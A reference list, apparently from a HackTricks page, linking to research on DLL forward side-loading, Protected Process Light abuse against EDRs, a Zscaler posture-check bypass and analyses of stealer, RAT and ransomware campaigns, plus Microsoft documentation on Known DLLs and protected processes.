- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
